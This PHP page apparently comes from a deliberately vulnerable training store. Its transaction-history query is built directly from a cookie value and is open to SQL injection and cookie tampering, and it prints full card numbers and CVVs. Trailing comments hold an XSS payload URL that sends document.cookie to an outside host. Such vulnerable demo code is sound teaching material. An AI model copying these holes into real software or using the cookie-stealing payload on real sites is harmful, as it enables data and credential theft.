<?php
include("config.php");
include("header.php");
//phpinfo();
//print_r($_GET);

//vulnerability here - change the cookie using browser 
//to get transaction data of any user

//perform sql injection, drop the transaction
//table

if (!isset($_COOKIE["email"])) {
	?>	
		Redirecting you to store...
		<script>top.location.href="http://<?= $site ?>";</script>
	<?php
} else {
	?>

	<?php if (1 == 1) { ?>
		<div style="border: 1px solid #C9C9C9; width: 300px; padding: 5px 10px; margin: 10px 0 10px 0; font-weight: bold;">

		Find Transaction / Order History<br /><br />
		<form action="user.php" method="GET">
			<input type="text" name="from" placeholder="Enter start date" /><br />
			<input type="submit" name="submitdate" value="Go" />
		</form>	
		<br />
		<em></em>

		</div>

	<?php } ?>

	<?php
	if ($suc == 2) { ?>

		<div style="border: 1px solid #C9C9C9; width: 300px; padding: 5px 10px; margin: 10px 0 10px 0; font-size: 12px; font-weight: bold;">
		Invalid Input or No Transactions
		</div>

	<?php } ?>	


	<?php
	$suc = 0;

	//process transaction fetch
	if (isset($_COOKIE["email"]) && isset($_GET["from"]) && isset($_GET["submitdate"])) {

		//no input sanitisation big vulnerability
		//no check for blank input
		$qc = "SELECT * FROM transaction WHERE uid = '".$_COOKIE["email"]."'";
		if ($_GET["from"] != "") {
			$qc = $qc . "";
		}
		$rc = mysql_query($qc);
		if (mysql_num_rows($rc) > 0) {

			echo '<div style="border: 1px solid #C9C9C9; width: 300px; padding: 5px 10px; margin: 10px 0 10px 0; font-size: 12px; "><b>Your summary:</b><br />';

			$suc = 1;

			while ($row = mysql_fetch_array($rc)) {

				?>

				
					<ul><li>On <?= $row["timedate"] ?>, bought <?= $row["qty"] ?> (qty) of 
					<a href="product.php?product=<?= $row['prodid'] ?>">Product <?= $row['prodid'] ?></a> 
					using Card - <?= $row["ccnumber"] ?> [<?= $row["cvvnumber"] ?>, <?= $row["expiry"] ?>]</li></ul>
				

				<?php

			}

			echo '</div>';

		} else {
			$suc = 2;
		}

	}
	?>

	<?php

}


?>

<?php 
	include("footer.php"); 
?>

<!-- Chrome has AntiXSS filter so cool - http://blog.securitee.org/?p=37 -->
<!-- Steal cookies using XSS -->
<!-- http://amazon.two/product.php?product=%3Cscript%3Enew%20Image%28%29.src=%22http://google.com%22%3C/script%3E-->
<!-- http://amazon.two/product.php?product=<script>new Image().src="http://good.site/iamgood/showimage.php?param="+document.cookie</script> -->
<!-- html injection vulnerability for breadcrumb -->
<!-- python script to demonstrate CSRF vulnerability-->